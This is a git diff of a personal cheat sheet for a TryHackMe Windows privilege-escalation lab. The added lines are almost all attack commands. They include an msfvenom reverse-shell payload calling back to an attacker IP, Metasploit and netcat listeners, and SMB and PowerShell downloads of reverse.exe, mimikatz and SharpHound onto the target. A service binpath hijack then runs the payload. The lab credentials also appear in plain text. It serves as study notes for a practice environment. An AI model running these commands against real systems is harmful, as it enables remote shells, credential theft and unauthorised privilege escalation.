@@ -3,19 +3,38 @@
 ## TRYHACKME
 ```
 https://tryhackme.com/room/windows10privesc
-```
 
+VULENRABLE VM ACCESS
+xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.63.26 
 
-## FILE TRANSFER - WEB BASED
-```
+PAYLOAD CREATION
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=1234 -f exe -o reverse.exe
+
+LISTENER SETUP (OPTION1)
+msfconsole
+use exploit/multi/handler 
+set payload windows/x64/shell_reverse_tcp
+set lhost 10.18.5.137
+set lport 1234
+run
+
+LISTENER SETUP (OPTION2)
+nc -nlvp 1234
+
+COPY FROM KALI TO WINDOWS - USING SMB SERVER & COPY
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+copy \\10.18.5.137\kali\reverse.exe C:\PrivEsc\reverse.exe
+copy \\192.168.174.132\kali\mimikatz.exe C:\PrivEsc\mimikatz.exe
+
+COPY FROM KALI TO WINDOWS - USING PYTHON WEB SERVER & POWERSHELL
+(New-Object System.Net.WebClient).DownloadFile("http://192.168.174.132:8000/mimikatz.exe", "C:\temp\mimikatz.exe")
+(New-Object System.Net.WebClient).DownloadFile("http://192.168.174.132:8000/SharpHound.exe", "C:\temp\SharpHound.exe")
+
+COPY FROM KALI TO LINUX - USING PYTHON WEB SERVER & WGET
 cd /var/www/html/priv_esc
 python3 -m http.server
 wget http://10.18.5.137:8000/shell.elf
 ```
-
-## FILE TRANSFER - SMB BASED
-
-
 
 # 2. MANUAL ENUMERATION 
 
@@ -102,6 +121,16 @@ sc config daclsvc binpath="\"C:\PrivEsc\reverse.exe\""
 sc qc daclsvc
 sc start daclsvc
 ```
+
+
+
+
+
+
+
+
+
+
 
 
 
